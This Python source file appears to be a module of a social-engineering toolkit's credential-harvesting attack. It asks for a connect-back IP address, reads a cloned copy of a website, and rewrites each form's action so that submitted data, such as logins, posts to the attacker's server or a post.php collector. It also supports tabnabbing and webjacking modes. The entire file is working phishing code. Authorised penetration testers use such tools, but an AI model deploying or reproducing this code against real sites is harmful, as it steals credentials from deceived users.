import os
import sys
import re
import subprocess
import urllib
import shutil
from src.core.setcore import *
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = input(setcore.setprompt(
        "0", "IP address to connect back on: "))
    update_options("IPADDR=" + ipaddr)
multi_tabnabbing = "off"
multi_webjacking = "off"
if os.path.isfile(userconfigpath + "multi_tabnabbing"):
    multi_tabnabbing = "on"
if os.path.isfile(userconfigpath + "multi_webjacking"):
    multi_webjacking = "on"
fileopen = open(userconfigpath + "attack_vector", "r")
for line in fileopen:
    line = line.rstrip()
    if line == 'tabnabbing' or multi_tabnabbing == "on" or line == 'webjacking' or multi_webjacking == "on":
        site = 'index2.html'
    else:
        site = 'index.html'
ssl_flag = "false"
ssl_check = check_config("WEBATTACK_SSL=").lower()
if ssl_check == "on":
    ssl_flag = "true"
apache_mode = check_config("APACHE_SERVER=").lower()
track_user = check_config("TRACK_EMAIL_ADDRESSES=").lower()
if track_user == "on":
    apache_mode = "on"
apache_rewrite = ""
if apache_mode == "on":
    apache_rewrite = "post.php"
fileopen = open(userconfigpath + "web_clone/%s" % (site), "r", encoding='utf-8', errors='ignore').readlines()
filewrite = open(userconfigpath + "web_clone/index.html.new", "w")
for line in fileopen:
    counter = 0
    match = re.search('post', line, flags=re.IGNORECASE)
    method_post = re.search("method=post", line, flags=re.IGNORECASE)
    if match or method_post:
        if ssl_flag == 'false':
            line = re.sub(
                r'action="http?\w://[\w.\?=/&]*/', 'action="http://%s/' % (ipaddr), line)
            if apache_mode == "on":
                line = re.sub(
                    'action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
        if ssl_flag == 'true':
            line = re.sub(
                r'action="http?\w://[\w.\?=/&]*/', 'action="https://%s/' % (ipaddr), line)
            if apache_mode == "on":
                line = re.sub(
                    'action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
    match2 = re.search(
        "swiftActionQueue={buckets:j", line, flags=re.IGNORECASE)
    if match2:
        line = line.replace(
            "swiftActionQueue={buckets:j", "swiftActionQueue={3buckets:j")
    filewrite.write(line)
filewrite.close()
if os.path.isfile(userconfigpath + "web_clone/index.html.new"):
    shutil.copyfile(userconfigpath + "web_clone/index.html.new", userconfigpath + "" + site)
    if os.path.isfile(userconfigpath + "web_clone/" + site):
        os.remove(userconfigpath + "web_clone/" + site)
    shutil.move(userconfigpath + "web_clone/index.html.new",
                userconfigpath + "web_clone/%s" % (site))